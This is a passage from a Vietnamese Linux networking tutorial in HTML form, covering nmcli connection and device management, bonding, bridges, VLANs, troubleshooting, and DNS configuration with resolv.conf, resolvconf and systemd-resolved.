</span></span></span><span class=line><span class=cl><span class=se></span>    con-name <span class=s2>&#34;My Ethernet&#34;</span> <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>    ifname eth0
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Tạo connection với static IP</span>
</span></span><span class=line><span class=cl>nmcli connection add <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>    <span class=nb>type</span> ethernet <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>    con-name <span class=s2>&#34;Static Eth&#34;</span> <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>    ifname eth0 <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>    ipv4.method manual <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>    ipv4.addresses 192.168.1.100/24 <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>    ipv4.gateway 192.168.1.1 <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>    ipv4.dns <span class=s2>&#34;8.8.8.8,8.8.4.4&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Modify connection</span>
</span></span><span class=line><span class=cl>nmcli connection modify <span class=s2>&#34;My Ethernet&#34;</span> <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>    ipv4.method manual <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>    ipv4.addresses 192.168.1.50/24 <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>    ipv4.gateway 192.168.1.1
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Thêm secondary IP</span>
</span></span><span class=line><span class=cl>nmcli connection modify <span class=s2>&#34;My Ethernet&#34;</span> <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>    +ipv4.addresses 192.168.1.51/24
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Xóa IP</span>
</span></span><span class=line><span class=cl>nmcli connection modify <span class=s2>&#34;My Ethernet&#34;</span> <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>    -ipv4.addresses 192.168.1.51/24
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Đổi DNS</span>
</span></span><span class=line><span class=cl>nmcli connection modify <span class=s2>&#34;My Ethernet&#34;</span> <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>    ipv4.dns <span class=s2>&#34;1.1.1.1,1.0.0.1&#34;</span> <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>    ipv4.ignore-auto-dns yes
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Reload connection (apply changes)</span>
</span></span><span class=line><span class=cl>nmcli connection reload
</span></span><span class=line><span class=cl>nmcli connection up <span class=s2>&#34;My Ethernet&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Clone connection</span>
</span></span><span class=line><span class=cl>nmcli connection clone <span class=s2>&#34;My Ethernet&#34;</span> <span class=s2>&#34;My Ethernet Backup&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Xóa connection</span>
</span></span><span class=line><span class=cl>nmcli connection delete <span class=s2>&#34;My Ethernet Backup&#34;</span></span></span></code></pre></div><h3 class=heading-element id=105-quản-lý-devices><span>10.5 Quản Lý Devices</span>
<a href=#105-qu%e1%ba%a3n-l%c3%bd-devices class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># Bật/tắt device</span>
</span></span><span class=line><span class=cl>nmcli device connect eth0
</span></span><span class=line><span class=cl>nmcli device disconnect eth0
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Reapply config (không cần down/up)</span>
</span></span><span class=line><span class=cl>nmcli device reapply eth0
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Set device managed/unmanaged</span>
</span></span><span class=line><span class=cl>nmcli device <span class=nb>set</span> eth0 managed yes
</span></span><span class=line><span class=cl>nmcli device <span class=nb>set</span> eth0 managed no    <span class=c1># NetworkManager bỏ qua device này</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># WiFi operations</span>
</span></span><span class=line><span class=cl>nmcli device wifi list              <span class=c1># Scan WiFi networks</span>
</span></span><span class=line><span class=cl>nmcli device wifi rescan            <span class=c1># Force rescan</span>
</span></span><span class=line><span class=cl>nmcli device wifi connect <span class=s2>&#34;SSID&#34;</span> password <span class=s2>&#34;password&#34;</span>
</span></span><span class=line><span class=cl>nmcli device wifi connect <span class=s2>&#34;SSID&#34;</span> password <span class=s2>&#34;password&#34;</span> hidden yes  <span class=c1># Hidden network</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Bật/tắt WiFi radio</span>
</span></span><span class=line><span class=cl>nmcli radio wifi on
</span></span><span class=line><span class=cl>nmcli radio wifi off</span></span></code></pre></div><h3 class=heading-element id=106-advanced-bonding-bridge-vlan><span>10.6 Advanced: Bonding, Bridge, VLAN</span>
<a href=#106-advanced-bonding-bridge-vlan class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># Tạo Bond (Link Aggregation)</span>
</span></span><span class=line><span class=cl>nmcli connection add <span class=nb>type</span> bond <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>    con-name bond0 <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>    ifname bond0 <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>    bond.options <span class=s2>&#34;mode=802.3ad,miimon=100&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Thêm slaves vào bond</span>
</span></span><span class=line><span class=cl>nmcli connection add <span class=nb>type</span> ethernet <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>    con-name bond0-slave1 <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>    ifname eth0 <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>    master bond0
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>nmcli connection add <span class=nb>type</span> ethernet <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>    con-name bond0-slave2 <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>    ifname eth1 <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>    master bond0
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Bond modes:</span>
</span></span><span class=line><span class=cl><span class=c1># 0 = balance-rr (round-robin)</span>
</span></span><span class=line><span class=cl><span class=c1># 1 = active-backup</span>
</span></span><span class=line><span class=cl><span class=c1># 2 = balance-xor</span>
</span></span><span class=line><span class=cl><span class=c1># 3 = broadcast</span>
</span></span><span class=line><span class=cl><span class=c1># 4 = 802.3ad (LACP) - cần switch hỗ trợ</span>
</span></span><span class=line><span class=cl><span class=c1># 5 = balance-tlb</span>
</span></span><span class=line><span class=cl><span class=c1># 6 = balance-alb</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Tạo Bridge</span>
</span></span><span class=line><span class=cl>nmcli connection add <span class=nb>type</span> bridge <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>    con-name br0 <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>    ifname br0
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>nmcli connection add <span class=nb>type</span> ethernet <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>    con-name br0-slave <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>    ifname eth0 <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>    master br0
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Tạo VLAN</span>
</span></span><span class=line><span class=cl>nmcli connection add <span class=nb>type</span> vlan <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>    con-name eth0.100 <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>    ifname eth0.100 <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>    dev eth0 <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>    id <span class=m>100</span> <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>    ipv4.method manual <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>    ipv4.addresses 10.100.0.10/24</span></span></code></pre></div><h3 class=heading-element id=107-troubleshooting><span>10.7 Troubleshooting</span>
<a href=#107-troubleshooting class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># Logs</span>
</span></span><span class=line><span class=cl>journalctl -u NetworkManager -f
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Debug level</span>
</span></span><span class=line><span class=cl>nmcli general logging level DEBUG domains ALL
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Connection file location</span>
</span></span><span class=line><span class=cl>ls /etc/NetworkManager/system-connections/
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Xem connection file (INI format)</span>
</span></span><span class=line><span class=cl>cat /etc/NetworkManager/system-connections/my-connection.nmconnection
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Reload all connection files</span>
</span></span><span class=line><span class=cl>nmcli connection reload
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Restart NetworkManager</span>
</span></span><span class=line><span class=cl>systemctl restart NetworkManager</span></span></code></pre></div><hr><h2 class=heading-element id=phần-11-dns-resolution---resolvectl--resolvconf><span>PHẦN 11: DNS RESOLUTION - RESOLVECTL & RESOLVCONF</span>
<a href=#ph%e1%ba%a7n-11-dns-resolution---resolvectl--resolvconf class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h2><h3 class=heading-element id=111-dns-resolution-architecture><span>11.1 DNS Resolution Architecture</span>
<a href=#111-dns-resolution-architecture class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-markdown data-lang=markdown><span class=line><span class=cl>┌─────────────────────────────────────────────────────────────┐
</span></span><span class=line><span class=cl>│              LINUX DNS RESOLUTION STACK                     │
</span></span><span class=line><span class=cl>└─────────────────────────────────────────────────────────────┘
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Có 3 phương pháp chính:
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>1.</span> Traditional: /etc/resolv.conf (static file)
</span></span><span class=line><span class=cl>   ┌──────────────────┐
</span></span><span class=line><span class=cl>   │ Application      │
</span></span><span class=line><span class=cl>   │ (gethostbyname)  │
</span></span><span class=line><span class=cl>   └────────┬─────────┘
</span></span><span class=line><span class=cl>            │
</span></span><span class=line><span class=cl>   ┌────────▼─────────┐
</span></span><span class=line><span class=cl>   │ glibc resolver   │
</span></span><span class=line><span class=cl>   │ (libnss_dns)     │
</span></span><span class=line><span class=cl>   └────────┬─────────┘
</span></span><span class=line><span class=cl>            │ Đọc /etc/resolv.conf
</span></span><span class=line><span class=cl>   ┌────────▼─────────┐
</span></span><span class=line><span class=cl>   │ DNS Server       │
</span></span><span class=line><span class=cl>   │ (8.8.8.8, etc)   │
</span></span><span class=line><span class=cl>   └──────────────────┘
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>2.</span> systemd-resolved (Modern - Ubuntu 18+, Fedora, RHEL 8+)
</span></span><span class=line><span class=cl>   ┌──────────────────┐
</span></span><span class=line><span class=cl>   │ Application      │
</span></span><span class=line><span class=cl>   └────────┬─────────┘
</span></span><span class=line><span class=cl>            │
</span></span><span class=line><span class=cl>   ┌────────▼─────────┐
</span></span><span class=line><span class=cl>   │ systemd-resolved │ ← Local caching DNS stub resolver
</span></span><span class=line><span class=cl>   │ (127.0.0.53:53)  │
</span></span><span class=line><span class=cl>   └────────┬─────────┘
</span></span><span class=line><span class=cl>            │
</span></span><span class=line><span class=cl>   ┌────────▼─────────┐
</span></span><span class=line><span class=cl>   │ Upstream DNS     │
</span></span><span class=line><span class=cl>   │ (per-interface)  │
</span></span><span class=line><span class=cl>   └──────────────────┘
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>3.</span> NetworkManager + systemd-resolved (Phổ biến nhất)
</span></span><span class=line><span class=cl>   NetworkManager cấu hình DNS → systemd-resolved xử lý
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Kiểm tra hệ thống dùng gì:
</span></span><span class=line><span class=cl>$ ls -la /etc/resolv.conf
</span></span><span class=line><span class=cl><span class=gh># Nếu symlink đến /run/systemd/resolve/stub-resolv.conf → systemd-resolved
</span></span></span><span class=line><span class=cl><span class=gh># Nếu symlink đến /run/NetworkManager/resolv.conf → NetworkManager direct
</span></span></span><span class=line><span class=cl><span class=gh></span># Nếu regular file → Traditional/manual</span></span></code></pre></div><h3 class=heading-element id=112-etcresolvconf-traditional><span>11.2 /etc/resolv.conf (Traditional)</span>
<a href=#112-etcresolvconf-traditional class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># /etc/resolv.conf format:</span>
</span></span><span class=line><span class=cl>nameserver 8.8.8.8          <span class=c1># Primary DNS</span>
</span></span><span class=line><span class=cl>nameserver 8.8.4.4          <span class=c1># Secondary DNS</span>
</span></span><span class=line><span class=cl>search example.com corp.example.com   <span class=c1># Search domains</span>
</span></span><span class=line><span class=cl>domain example.com          <span class=c1># Default domain</span>
</span></span><span class=line><span class=cl>options timeout:2 attempts:3 rotate   <span class=c1># Options</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Giải thích options:</span>
</span></span><span class=line><span class=cl><span class=c1># timeout:n   - Timeout n giây mỗi query</span>
</span></span><span class=line><span class=cl><span class=c1># attempts:n  - Retry n lần</span>
</span></span><span class=line><span class=cl><span class=c1># rotate      - Round-robin giữa nameservers</span>
</span></span><span class=line><span class=cl><span class=c1># ndots:n     - Nếu hostname có &lt; n dots, thử search domains</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Query flow với search domain:</span>
</span></span><span class=line><span class=cl><span class=c1># Query: &#34;myserver&#34;</span>
</span></span><span class=line><span class=cl><span class=c1># 1. myserver.example.com</span>
</span></span><span class=line><span class=cl><span class=c1># 2. myserver.corp.example.com</span>
</span></span><span class=line><span class=cl><span class=c1># 3. myserver (nếu có dot hoặc FQDN)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Vấn đề: File có thể bị overwrite bởi DHCP/NetworkManager</span>
</span></span><span class=line><span class=cl><span class=c1># Giải pháp cũ: chattr +i /etc/resolv.conf (immutable)</span>
</span></span><span class=line><span class=cl><span class=c1># Giải pháp đúng: Dùng resolvconf hoặc systemd-resolved</span></span></span></code></pre></div><h3 class=heading-element id=113-resolvconf-legacy-wrapper><span>11.3 resolvconf (Legacy Wrapper)</span>
<a href=#113-resolvconf-legacy-wrapper class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># resolvconf = Framework quản lý /etc/resolv.conf</span>
</span></span><span class=line><span class=cl><span class=c1># Nhiều processes có thể contribute DNS config</span>
</span></span><span class=line><span class=cl><span class=c1># resolvconf merge lại thành /etc/resolv.conf</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Cài đặt (nếu chưa có)</span>
</span></span><span class=line><span class=cl>apt install resolvconf      <span class=c1># Debian/Ubuntu</span>
</span></span><span class=line><span class=cl>yum install openresolv      <span class=c1># RHEL/CentOS</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Thêm DNS từ script</span>
</span></span><span class=line><span class=cl><span class=nb>echo</span> <span class=s2>&#34;nameserver 8.8.8.8&#34;</span> <span class=p>|</span> resolvconf -a eth0.dhcp
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Xóa DNS của interface</span>
</span></span><span class=line><span class=cl>resolvconf -d eth0.dhcp
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Xem current contributors</span>
</span></span><span class=line><span class=cl>resolvconf --list
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Force update /etc/resolv.conf</span>
</span></span><span class=line><span class=cl>resolvconf -u
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Config: /etc/resolvconf/resolv.conf.d/</span>
</span></span><span class=line><span class=cl><span class=c1># head   - Prepend vào resolv.conf</span>
</span></span><span class=line><span class=cl><span class=c1># base   - Default content</span>
</span></span><span class=line><span class=cl><span class=c1># tail   - Append vào resolv.conf</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Ví dụ: Thêm DNS cố định</span>
</span></span><span class=line><span class=cl><span class=nb>echo</span> <span class=s2>&#34;nameserver 1.1.1.1&#34;</span> &gt;&gt; /etc/resolvconf/resolv.conf.d/head
</span></span><span class=line><span class=cl>resolvconf -u
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># NOTE: resolvconf đang bị thay thế bởi systemd-resolved</span>
</span></span><span class=line><span class=cl><span class=c1># Trên Ubuntu 18+, resolvconf là symlink đến resolvectl</span></span></span></code></pre></div><h3 class=heading-element id=114-systemd-resolved--resolvectl><span>11.4 systemd-resolved & resolvectl</span>
<a href=#114-systemd-resolved--resolvectl class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># systemd-resolved = Modern DNS resolver</span>
</span></span><span class=line><span class=cl><span class=c1># Features:</span>
</span></span><span class=line><span class=cl><span class=c1># - Per-interface DNS config</span>
</span></span><span class=line><span class=cl><span class=c1># - DNSSEC validation</span>
</span></span><span class=line><span class=cl><span class=c1># - DNS-over-TLS (DoT)</span>
</span></span><span class=line><span class=cl><span class=c1># - Caching</span>
</span></span><span class=line><span class=cl><span class=c1># - LLMNR/mDNS</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Kiểm tra status</span>
</span></span><span class=line><span class=cl>resolvectl status
</span></span><span class=line><span class=cl><span class=c1># hoặc</span>
</span></span><span class=line><span class=cl>systemd-resolve --status    <span class=c1># Deprecated alias</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Output:</span>
</span></span><span class=line><span class=cl><span class=c1># Global</span>
</span></span><span class=line><span class=cl><span class=c1>#        Protocols: +LLMNR +mDNS -DNSOverTLS DNSSEC=no/unsupported</span>
</span></span><span class=line><span class=cl><span class=c1># resolv.conf mode: stub</span>
</span></span><span class=line><span class=cl><span class=c1>#</span>
</span></span><span class=line><span class=cl><span class=c1># Link 2 (eth0)</span>
</span></span><span class=line><span class=cl><span class=c1>#     Current Scopes: DNS</span>
</span></span><span class=line><span class=cl><span class=c1>#          Protocols: +DefaultRoute +LLMNR -mDNS -DNSOverTLS DNSSEC=no/unsupported</span>
</span></span><span class=line><span class=cl><span class=c1># Current DNS Server: 192.168.1.1</span>
</span></span><span class=line><span class=cl><span class=c1>#        DNS Servers: 192.168.1.1</span>
</span></span><span class=line><span class=cl><span class=c1>#         DNS Domain: ~.</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Query DNS (thay thế nslookup/dig)</span>
</span></span><span class=line><span class=cl>resolvectl query google.com
</span></span><span class=line><span class=cl>resolvectl query -t MX google.com     <span class=c1># Query MX record</span>
</span></span><span class=line><span class=cl>resolvectl query -t AAAA google.com   <span class=c1># Query IPv6</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Xem statistics</span>
</span></span><span class=line><span class=cl>resolvectl statistics
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Flush DNS cache</span>
</span></span><span class=line><span class=cl>resolvectl flush-caches
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Reset server features (sau khi thay đổi upstream)</span>
</span></span><span class=line><span class=cl>resolvectl reset-server-features
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Set DNS cho interface</span>
</span></span><span class=line><span class=cl>resolvectl dns eth0 8.8.8.8 8.8.4.4
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Set search domain</span>
</span></span><span class=line><span class=cl>resolvectl domain eth0 example.com corp.example.com
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Revert về DHCP-provided DNS</span>
</span></span><span class=line><span class=cl>resolvectl revert eth0</span></span></code></pre></div><h3 class=heading-element id=115-systemd-resolved-configuration><span>11.5 systemd-resolved Configuration</span>
<a href=#115-systemd-resolved-configuration class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># Config file: /etc/systemd/resolved.conf</span>
</span></span><span class=line><span class=cl><span class=c1># [Resolve]</span>
</span></span><span class=line><span class=cl><span class=c1># DNS=8.8.8.8 8.8.4.4 1.1.1.1</span>
</span></span><span class=line><span class=cl><span class=c1># FallbackDNS=9.9.9.9</span>
</span></span><span class=line><span class=cl><span class=c1># Domains=~.</span>
</span></span><span class=line><span class=cl><span class=c1># DNSSEC=allow-downgrade</span>
</span></span><span class=line><span class=cl><span class=c1># DNSOverTLS=opportunistic</span>
</span></span><span class=line><span class=cl><span class=c1># Cache=yes</span>
</span></span><span class=line><span class=cl><span class=c1># DNSStubListener=yes</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Giải thích:</span>
</span></span><span class=line><span class=cl><span class=c1># DNS=              Global DNS servers</span>
</span></span><span class=line><span class=cl><span class=c1># FallbackDNS=      Fallback nếu không có DNS từ interface</span>
</span></span><span class=line><span class=cl><span class=c1># Domains=~.        Routing domain (~ = không phải search domain)</span>
</span></span><span class=line><span class=cl><span class=c1># DNSSEC=           no, allow-downgrade, yes</span>
</span></span><span class=line><span class=cl><span class=c1># DNSOverTLS=       no, opportunistic, yes</span>
